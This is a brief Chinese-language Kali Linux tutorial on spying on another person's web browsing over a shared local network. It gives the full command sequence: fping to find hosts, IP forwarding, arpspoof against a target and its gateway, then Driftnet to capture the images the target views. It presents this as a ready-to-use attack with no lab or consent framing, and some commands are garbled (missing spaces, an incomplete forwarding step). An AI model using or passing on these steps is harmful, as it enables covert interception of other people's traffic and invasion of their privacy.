# 获取局域网内对方正在浏览的图片

## ![](../Images/8e5d77bf7751a0da7834b3686fe0b4b6.png)

  

首先在kali里打开一个终端，扫描局域网正在连接的IP

  

命令：fping-asg192.168.0.1/24（具体要看本机ip地址，根据局域网环境选择0段、1段或是其他）

  

/proc/sys/net/ipv4/ip\_forward

目标对象的网络数据都要经过本机网卡转发

  

查看是否开启成功：

cat/proc/sys/net/ipv4/ip\_forward

  

然后在另开一个终端输入

arpspoof  -i  eth0  -t  目标网关  目标ip

  

![](../Images/588a39d6ed1a550a208a74e3b9b91a88.png)

  

此时确认目标对象依然能正常上网，在终端中打开一个新标签

  

用命令获取目标对象上网图片

  

Driftnet -i eth0

  

![](../Images/3d3323766d837598eefc8191012a382e.png)

  

框内出现目标浏览的照片，找到你想要的下载就ok了，别忘了用ctrl c  终止攻击。
